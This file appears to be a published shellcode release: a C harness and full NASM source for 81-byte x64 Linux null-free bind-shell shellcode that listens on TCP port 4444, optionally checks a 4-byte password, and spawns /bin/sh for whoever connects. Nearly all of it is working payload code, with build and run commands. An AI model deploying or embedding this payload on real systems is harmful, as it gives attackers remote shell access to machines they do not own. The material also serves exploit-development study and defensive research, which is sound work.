/*
* Author:           Sean Dillon
* Copyright:        (c) 2014 CAaNES, LLC. (http://caanes.com)
* Release Date:     December 19, 2014
*
* Description:      x64 Linux null-free TCP bind port shellcode, optional 4 byte password
* Assembled Size:   81 bytes, 96 with password
* Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64
* License:          http://opensource.org/license/MIT
*
* Build/Run:        gcc -m64 -z execstack -fno-stack-protector bindshell.c -o bindshell.out
*                   ./bindshell.out &
*                   nc localhost 4444
*/

/*
* NOTE: This C code binds on port 4444 and does not have the password option enabled.
* The end of this file contains the .nasm source code and instructions for building from that.
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
	"\x31\xf6"                      /* xor    %esi,%esi */
	"\xf7\xe6"                      /* mul    %esi */
	"\xff\xc6"                      /* inc    %esi */
	"\x6a\x02"                      /* pushq  $0x2 */
	"\x5f"                          /* pop    %rdi */
	"\x04\x29"                      /* add    $0x29,%al */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x52"                          /* push   %rdx */
	"\x52"                          /* push   %rdx */
	"\xc6\x04\x24\x02"              /* movb   $0x2,(%rsp) */
	"\x66\xc7\x44\x24\x02\x11\x5c"  /* movw   $0x5c11,0x2(%rsp) */
	"\x54"                          /* push   %rsp */
	"\x5e"                          /* pop    %rsi */
	"\x52"                          /* push   %rdx */
	"\x6a\x10"                      /* pushq  $0x10 */
	"\x5a"                          /* pop    %rdx */
	"\x6a\x31"                      /* pushq  $0x31 */
	"\x58"                          /* pop    %rax */
	"\x0f\x05"                      /* syscall */
	"\x5e"                          /* pop    %rsi */
	"\xb0\x32"                      /* mov    $0x32,%al */
	"\x0f\x05"                      /* syscall */
	"\xb0\x2b"                      /* mov    $0x2b,%al */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x6a\x03"                      /* pushq  $0x3 */
	"\x5e"                          /* pop    %rsi */
	"\xff\xce"                      /* dec    %esi */
	"\xb0\x21"                      /* mov    $0x21,%al */
	"\x0f\x05"                      /* syscall */
	"\x75\xf8"                      /* jne    35 <dupe_loop> */
	"\x56"                          /* push   %rsi */
	"\x5a"                          /* pop    %rdx */
	"\x56"                          /* push   %rsi */
	"\x48\xbf\x2f\x2f\x62\x69\x6e"  /* movabs $0x68732f6e69622f2f,%rdi */
	"\x2f\x73\x68"                  /* . */
	"\x57"                          /* push   %rdi */
	"\x54"                          /* push   %rsp */
	"\x5f"                          /* pop    %rdi */
	"\xb0\x3b"                      /* mov    $0x3b,%al */
	"\x0f\x05"                      /* syscall */;

main(void)
{
	printf("Shellcode length: %d\n", (int)strlen(shellcode));

	/* pollute registers and call shellcode */
	__asm__ (	 "mov $0xffffffffffffffff, %rax\n\t"
		         "mov %rax, %rbx\n\t"
		         "mov %rax, %rcx\n\t"
		         "mov %rax, %rdx\n\t"
		         "mov %rax, %rsi\n\t"
		         "mov %rax, %rdi\n\t"
		         "mov %rax, %rbp\n\t"

		         "call shellcode"	);
}

/* --------------------------------------------------------------------------------------

; Author:           Sean Dillon
; Company:          CAaNES, LLC. (http://caanes.com)
; Release Date:     December 19, 2014
;
; Description:      x64 Linux null-free bind TCP port shellcode, optional 4 byte password
; Assembled Size:   81 bytes, 96 with password
; Tested On:        Kali 1.0.9a GNU/Linux 3.14.5-kali1-amd64 x86_64
; License:          http://opensource.org/license/MIT
;
; Build/Run:        nasm -f elf64 -o bindshell.o bindshell.nasm
;                   ld -o bindshell bindshell.o
;                   objdump -d --disassembler-options=addr64 bindshell

BITS 64
global _start
section .text

; settings
%define     USEPASSWORD     ; comment this to not require password
PASSWORD    equ 'Z~r0'      ; cmp dword (SEGFAULT on fail; no bruteforce/cracking/etc.)
PORT        equ 0x5c11      ; default 4444

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_BIND    equ 0x31
SYS_LISTEN  equ 0x32
SYS_ACCEPT  equ 0x2b
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

; argument constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1

_start:
; High level psuedo-C overview of shellcode logic:
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
; struct sockaddr = {AF_INET; [PORT; 0x0; 0x0]}
;
; bind(sockfd, &sockaddr, 16)
; listen(sockfd, 0)
; client = accept(sockfd, &sockaddr, 16)
;
; read(client, *pwbuf, 16)  // 16 > 4
; if (pwbuf != PASSWORD) goto drop
;
; dup2(client, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

    xor esi, esi            ; 0 out rsi
    mul esi                 ; 0 out rax, rdx

                            ; rdx = IPPROTO_IP (int: 0)

    inc esi                 ; rsi = SOCK_STREAM (int: 1)

    push AF_INET            ; rdi = AF_INET (int: 2)
    pop rdi

    add al, SYS_SOCKET
    syscall

    ; store sock
    push rax
    pop rdi                 ; rdi = sockfd

struct_sockaddr:
    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}

    push rdx                        ; 0 out the stack for struct
    push rdx

    mov byte [rsp], AF_INET         ; sockaddr.sa_family = AF_INET (u_char)
    mov word [rsp + 0x2], PORT      ; sockaddr.sa_data[] = PORT (short)
    push rsp
    pop rsi                         ; rsi = &sockaddr

bind_port:
    ; bind(sockfd, const struct sockaddr *addr, 16)

    push rdx                        ; save 0 for rsi in SYS_LISTEN

    push 0x10                       ; rdx = 16 (sizeof sockaddr)
    pop rdx

    push SYS_BIND
    pop rax
    syscall

server_listen:
    ; listen(sockfd, 0)

    pop rsi                 ; backlog = 0 (int)
    mov al, SYS_LISTEN
    syscall

client_accept:
    ; client = accept(sockfd, struct sockaddr *addr, 16)

    mov al, SYS_ACCEPT
    syscall

    ; store client
    push rax
    pop rdi                 ; rdi = client

    ; no need to close parent, save bytes

%ifdef USEPASSWORD
password_check:
    ; password = read(client, *buf, 4)

    push rsp
    pop rsi                         ; rsi = &buf (char*)

                                    ; rdx = 0x10, >4 bytes
    xor eax, eax                    ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD       ; simple comparison
    jne drop                        ; bad pw, abort
%endif

dupe_sockets:
    ; dup2(client, STDIN)
    ; dup2(client, STDOUT)
    ; dup2(client, STERR)

    push 0x3                ; loop down file descriptors for I/O
    pop rsi

dupe_loop:
    dec esi
    mov al, SYS_DUP2
    syscall

    jne dupe_loop

exec_shell:
    ; execve('//bin/sh', NULL, NULL)

    push rsi                    ; *argv[] = 0
    pop rdx                     ; *envp[] = 0

    push rsi                    ; '\0'
    mov rdi, '//bin/sh'         ; str
    push rdi
    push rsp
    pop rdi                     ; rdi = &str (char*)

    mov al, SYS_EXECVE          ; we fork with this syscall
    syscall

drop:
    ; password check failed, crash program with BADINSTR/SEGFAULT

;--------------------------------------------------------------------------------------*/